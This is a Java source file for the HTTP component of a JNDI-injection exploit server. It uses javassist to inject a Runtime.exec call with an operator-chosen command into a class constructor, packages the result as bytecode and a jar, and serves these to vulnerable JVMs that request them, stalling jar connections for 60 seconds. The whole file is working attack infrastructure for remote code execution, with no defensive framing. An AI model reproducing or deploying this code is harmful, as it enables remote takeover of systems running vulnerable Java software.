package com.rajasoun.jndi;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import java.io.ByteArrayOutputStream;
import java.net.InetSocketAddress;
import java.util.concurrent.Executors;
import java.util.jar.JarOutputStream;
import java.util.zip.ZipEntry;

import static org.apache.commons.text.StringEscapeUtils.escapeJava;

public class HttpServer implements HttpHandler {

	byte[] exportByteCode;
	byte[] exportJar;

	public static void start() throws Exception {
		System.out.println("Starting HTTP server on 0.0.0.0:" + Config.httpPort);
		com.sun.net.httpserver.HttpServer httpServer = com.sun.net.httpserver.HttpServer.create(new InetSocketAddress(Config.httpPort), 10);
		httpServer.createContext("/", new HttpServer());
		httpServer.setExecutor(Executors.newCachedThreadPool());
		httpServer.start();
	}

	public HttpServer() throws Exception {
		exportByteCode = patchBytecode(ExportObject.class, Config.command, "xExportObject");
		exportJar = createJar(exportByteCode, "xExportObject");
	}

	/**
	 * Patch the bytecode of supplied class constructor by injecting execution of a command
	 */
	byte[] patchBytecode(Class clazz, String command, String newName) throws Exception {

		//load ExploitObject.class bytecode
		ClassPool classPool = ClassPool.getDefault();
		CtClass exploitClass = classPool.get(clazz.getName());

		//patch its bytecode by adding a new command
		CtConstructor m = exploitClass.getConstructors()[0];
		m.insertBefore("{ Runtime.getRuntime().exec(\"" +  escapeJava(command) + "\"); }");
		exploitClass.setName(newName);
		exploitClass.detach();
		return exploitClass.toBytecode();
	}

	/**
	 * Create an executable jar based on supplied bytecode
	 */
	byte[] createJar(byte[] exportByteCode, String className) throws Exception {

		ByteArrayOutputStream bout = new ByteArrayOutputStream();
		JarOutputStream jarOut = new JarOutputStream(bout);
		jarOut.putNextEntry(new ZipEntry(className + ".class"));
		jarOut.write(exportByteCode);
		jarOut.closeEntry();
		jarOut.close();
		bout.close();

		return bout.toByteArray();
	}

	public void handle(HttpExchange exchange) {
		try {
			String path = exchange.getRequestURI().getPath();
			System.out.println("New http request from " + exchange.getRemoteAddress() + " asking for " + path);

			switch (path) {
				case "/xExportObject.class":
					String classPath = exchange.getRequestURI().getPath();
					String className = classPath.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
					System.out.println("[+] Receive ClassRequest: " + className + ".class");
					//send xExportObject bytecode back to client
					exchange.sendResponseHeaders(200, exportByteCode.length);
					exchange.getResponseBody().write(exportByteCode);
					System.out.println("[+] Response Code: " + 200);
					break;

				case "/xExportObject.jar":
					//send xExportObject bytecode in a jar archive
					//payload for artsploit.controllers.WebSphere1-2
					System.out.println("[+] Receive JarRequest: " + path + ".jar");
					exchange.sendResponseHeaders(200, exportJar.length+1);
					exchange.getResponseBody().write(exportJar);
					System.out.println("Stalling connection for 60 seconds");
					Thread.sleep(60000);
					System.out.println("Release stalling...");
					break;

				default:
					System.out.println("[+] Receive Non Standard Request : " + path );
					exchange.sendResponseHeaders(200, 0);
			}
			exchange.close();
		} catch(Exception e) {
			e.printStackTrace();
		}
	}
}
